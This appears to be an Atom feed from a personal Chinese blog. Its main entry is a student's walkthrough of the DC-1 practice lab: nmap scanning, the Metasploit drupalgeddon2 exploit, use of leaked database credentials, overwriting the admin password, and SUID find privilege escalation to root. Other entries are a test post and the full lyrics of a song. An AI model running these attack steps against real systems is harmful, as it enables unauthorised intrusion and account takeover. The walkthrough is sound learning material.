<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>星星堆满天</title>
  
  <subtitle>也不能比月圆</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-11-12T13:25:15.730Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>测试</title>
    <link href="http://example.com/2021/11/12/%E6%B5%8B%E8%AF%95/"/>
    <id>http://example.com/2021/11/12/%E6%B5%8B%E8%AF%95/</id>
    <published>2021-11-12T13:20:15.000Z</published>
    <updated>2021-11-12T13:25:15.730Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这是一个test</p><p>我要上传图片啦，希望它不会挂掉。</p><p>一个疑问：为什么刚生成一个md文件的时候 typora不能正常打字</p><img src="https://tva2.sinaimg.cn/large/006qJIWBgy1gwcod25wlfj302l02pmwy.jpg" alt="4E}1F5]045EV)P42(ZG7CF7" width="93" data-width="93" data-height="97">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DC-1 第一次渗透</title>
    <link href="http://example.com/2021/11/12/DC-1%20%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2021/11/12/DC-1%20%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/</id>
    <published>2021-11-12T13:20:15.000Z</published>
    <updated>2021-11-12T17:54:45.125Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1.首先启动靶机</p><p>2.由于靶机与虚拟机属于同一C段下，所以考虑使用nmap拿到靶机的ip地址，使用ifconfig命令，拿到这台虚拟机的内网ip</p><p>3.由于靶机与虚拟机处于同一c段，所以只需要扫描位于同一c段的主机，就可以进行主机发现。</p><p>使用命令 ，其中 -sP参数表示使用ping扫描, -oN是写入到其后的文件，在此条命令中表示将结果写入nmap.sP中， ip/24表示该ip下的所有c段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP ip/24 -oN nmap.sP</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104111014894.png" alt="image-20211104111014894"></p><p>扫出来以后 猜测靶机的IP为192.168.43.151</p><p>进行下一步的信息收集，要查看靶机开放了什么端口，端口上运行了什么服务</p><p>此处同样使用nmap工具，命令为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 靶机ip -oN nmap.A</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104111344566.png" alt="image-20211104111344566"></p><p>扫出来的结果 ：</p><p>22/tcp 说明开放了22端口 运行ssh服务（<strong>加密远程登录管理服务器</strong>，是一种安全的传输协议）</p><p>80/tcp  说明开放了80端口 运行HTTP服务</p><p>111/tcp 说明开放了111端口 运行rpcbind服务，是NFS中 用来进行消息通知的服务（具体是什么漏洞后续再加强学习）</p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>由于靶机开放了22端口和80端口，对于22端口上的ssh服务，如果不知道用户名和密码，尝试爆破是一 件很繁琐且效率很低的方法，所以考虑从网页入手。 使用浏览器访问该ip对应的web页面</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104112259804.png" alt="image-20211104112259804"></p><p>下载Wappalyzer插件，可以看到这个网站使用什么技术搭建的</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104112843654.png" alt="image-20211104112843654"></p><h2 id="获取webshell-shell"><a href="#获取webshell-shell" class="headerlink" title="获取webshell(shell)"></a>获取webshell(shell)</h2><p>Shell 是一个应用程序，它连接了用户和 Linux 内核，让用户能够更加高效、安全、低成本地使用 Linux 内核，这就是 Shell 的本质。</p><p>Shell 本身并不是内核的一部分，它只是站在内核的基础上编写的一个应用程序，它和 QQ、迅雷、Firefox 等其它软件没有什么区别。然而 Shell 也有着它的特殊性，就是开机立马启动，并呈现在用户面前；用户通过 Shell 来使用 Linux，不启动 Shell 的话，用户就没办法使用 Linux。</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104205226366.png" alt="image-20211104205226366"></p><p>使用命令msfconsole，打开一款非常强大的渗透工具</p><p>进入msfconsole,</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal 7</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104113205815.png" alt="image-20211104113205815"></p><p>目的是在metasploit里查找有没有相关drupalde 的利用脚本。</p><p>一般使用excellent的，由于第0个无法使用，这里使用第一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104113546750.png" alt="image-20211104113546750"></p><p>使用命令来进行参数设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104114147797.png" alt="image-20211104114147797"></p><p>对于Required为yes的项都需要设置才能使用，此处设置RHOSTS为目标靶机ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.10.142</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104114600384.png" alt="image-20211104114600384"></p><p>设置成功</p><p>使用命令exploit 启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p>可以看到已经攻击成功，已经建立了一个meterpreter会话，可以理解为建立了一个反弹shell</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104120711315.png" alt="image-20211104120711315"></p><p>攻击成功！！！！最后一句话  meterpreter opened</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104120937594.png" alt="image-20211104120937594"></p><p>可以看到已经进入到DC-1的主机了</p><p>但是现在并不是交互式的shell ,最好改成交互式的，先按下Ctrl+Z强制结束当前的shell,输入y确定 回退到meterpreter会话 再输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>进入到非交互式shell</p><p>在输入命令，这是为了变成交互式的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104121255815.png" alt="image-20211104121255815"></p><p>这就是交互式的shell/</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104121351858.png" alt="image-20211104121351858"></p><p>进入flag1看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104121445411.png" alt="image-20211104121445411"></p><p>根据提示</p><p>直接去网上搜drupal的文件结构 发现3.6 sites文件夹中有一个配置文件setting.php 则尝试去看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cd sites</span><br><span class="line">ls</span><br><span class="line">cd default</span><br><span class="line">ls</span><br><span class="line">cat settings.php</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104121744607.png" alt="image-20211104121744607"></p><p>进入以后可以看到flag2,提示：不要尝试字典爆破</p><p>看到有数据库，那就登录一下数据库</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104131132944.png" alt="image-20211104131132944"></p><p>进入到mysql啦</p><p>使用命令查数据库噢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104131338902.png" alt="image-20211104131338902"></p><p>查到数据库以后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">show tables;//注意这个地方的分号不能少</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104131513360.png" alt="image-20211104131513360"></p><p>查到了数据库的表名后，查看users这个表的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users \G;</span><br></pre></td></tr></table></figure><p>\G为了显示好看！</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104131819239.png" alt="image-20211104131819239"></p><p>可以看到这里的密码都经过了加密，但是不知道是什么加密方式</p><p>由于flag2中提示我们不要尝试着去暴力破解，既然我们没有办法得到它的密码，但由于我们拥有数据库 的权限，可以考虑将我们已知的密码加密之后覆盖原来的密码，就可以将我们已知的密码拿来登录，接 下来的思路便是，如何加密。 直接去google一下drupal的用户密码是如何加密的</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104132057388.png" alt="image-20211104132057388"></p><p>查找到这篇文章 发现scripts下有一个加密脚本，可以直接使用</p><p>先退出数据库，并且回到var/www的目录下</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104132343964.png" alt="image-20211104132343964"></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh 123 &gt;password.txt</span><br></pre></td></tr></table></figure><p>意思可能大概是 编写了一个php文件 用了password-hash.sh的转换形式，然后可以把123转换成与数据库相同的加密方式</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104132653248.png" alt="image-20211104132653248"></p><p>就拿到了123加密后的密码，接下来拿这行密码去替换mysql中的admin的密码， 进入mysql 使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&#x27;$S$DkN.RoKXZxoV58CBBB6ffl/FcI79v.iXXsAFeAPPwiS6OHvBkBR1&#x27;</span><br><span class="line">where uid=1;</span><br></pre></td></tr></table></figure><p>然后再查一下数据库的表</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104133141215.png" alt="image-20211104133141215"></p><p>成功更改！</p><p>然后尝试用这个用户去登录！非常好！登录成功！</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104133232946.png" alt="image-20211104133232946"></p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104133221565.png" alt="image-20211104133221565"></p><p>然后就随便点 ，content那里有个flag3</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104133350327.png" alt="image-20211104133350327"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>根据flag3中提到的关键词 perms find passwd -exec ，无论是正常的渗透测试流程，还是此处给出的提 示，都在指引我们走向提权。</p><p>此处flag提示的意义在于，它想让我们去读取/etc/passwd，但事实上这个文件需要root权限才能读取， 而我们只是一般的普通用户权限，故此处考虑提权。</p><p>由于提示了perm，则考虑使用<strong>具有suid的命令</strong>来提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure><p>提权！提权！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find password.txt -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104134008503.png" alt="image-20211104134008503"></p><p><strong>/etc/passwd 和/etc/shadow需要大家自行了解这两个文件的关系</strong></p><p>都是存放账号 的信息：用户名和密码之类的，但是/etc/passwd是任何用户都能访问，/etc/shadow是只有root用户能访问，且一般是加密过的。</p><p>现在的Unix/Linux系统中，口令不再直接保存在passwd文件中，通常将passwd文件中的口令字段使用一个“x”来代替，将/etc /shadow作为真正的口令文件，用于保存包括个人口令在内的数据。当然shadow文件是不能被普通用户读取的，只有超级用户才有权读取。</p><p>此外，需要注意的是，如果passwd字段中的第一个字符是“*”的话，那么，就表示该账号被查封了，系统不允许持有该账号的用户登录。</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104134501735.png" alt="image-20211104134501735"></p><p>cat /ect/passwd看到有flag 4</p><p>直接去搜这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag4*</span><br></pre></td></tr></table></figure><p>该命令表示 搜索根目录(/)下的所有文件 -name参数表示符合其后内容的文件名</p><p> *为linux中的通配符</p><p> 此处可以理解为任意字符任意数量 即flag4.lsjyyds flag4.lsjsb 都可以匹配到</p><p>搜到了这个</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104135152332.png" alt="image-20211104135152332"></p><p>直接进入文件</p><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104135104004.png" alt="image-20211104135104004"></p><p>根据提示，你可以用相同的方法进入root 吗，嗯就这样进入就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">cat thefinalflag.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20211104135018333.png" alt="image-20211104135018333"></p><p>很棒 结束了，但某些问题还是一头雾水，还要仔细复盘！</p><p>以上大部分来自于lj同学给的靶场通关笔记！讲得非常清楚！！！！<img src="http://tva2.sinaimg.cn/large/006qJIWBgy1gwcvvwzc26j3032028dfn.jpg" alt="image"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="学习" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>好想去看雪</title>
    <link href="http://example.com/2021/11/08/%E5%A5%BD%E6%83%B3%E5%8E%BB%E7%9C%8B%E9%9B%AA/"/>
    <id>http://example.com/2021/11/08/%E5%A5%BD%E6%83%B3%E5%8E%BB%E7%9C%8B%E9%9B%AA/</id>
    <published>2021-11-08T05:20:25.000Z</published>
    <updated>2021-11-08T17:14:01.285Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>I’m so glad you made time to see me</p><p>How’s life, tell me how’s your family</p><p>I haven’t seen them in a while</p><p>You’ve been good, busier than ever</p><p>We small talk, work and the weather</p><p>Your guard is up and I know why</p><p>Because the last time you saw me is still burned in the back of your mind</p><p>You gave me roses and I left them there to die</p><p>So this is me swallowing my pride</p><p>Standing in front of you saying I’m sorry for that night</p><p>And I go back to December all the time</p><p>It turns out freedom ain’t nothing but missing you</p><p>Wishing I’d realized what I had when you were mine</p><p>I go back to December, turn around and make it alright</p><p>I go back to December all the time</p><p>These days I haven’t been sleeping</p><p>Staying up playing back myself leaving</p><p>When your birthday passed and I didn’t call</p><p>Then I think about summer, all the beautiful times</p><p>I watched you laughing from the passenger side</p><p>And realized I loved you in the fall</p><p>And then the cold came, the dark days when fear crept into my mind</p><p>You gave me all your love and all I gave you was goodbye</p><p>So this is me swallowing my pride</p><p>Standing in front of you saying I’m sorry for that night</p><p>And I go back to December all the time</p><p>It turns out freedom ain’t nothing but missing you</p><p>Wishing I’d realized what I had when you were mine</p><p>I go back to December,</p><p>turn around and change my own mind</p><p>I go back to December all the time</p><p>I miss your tan skin, your sweet smile,</p><p>so good to me, so right</p><p>And how you held me in your arms that September night</p><p>The first time you ever saw me cry</p><p>Maybe this is wishful thinking</p><p>Probably mindless dreaming</p><p>But if we loved again, I swear I’d love you right</p><p>I’d go back in time and change it, but I can’t</p><p>So if the chain is on your door I understand</p><p>But this is me swallowing my pride</p><p>Standing in front of you saying I’m sorry for that night</p><p>And I go back to December</p><p>It turns out freedom ain’t nothing but missing you</p><p>Wishing I’d realized what I had when you were mine</p><p>I go back to December turn around and make it alright</p><p>I go back to December,</p><p>turn around and change my own mind</p><p>I go back to December all the time</p><p>All the time</p><hr><p>以上，分享一首很有冬天氛围的歌《Back To December》</p><p>就，看到北方同学的雪景图，突然就好想去看雪！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日常" scheme="http://example.com/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
</feed>
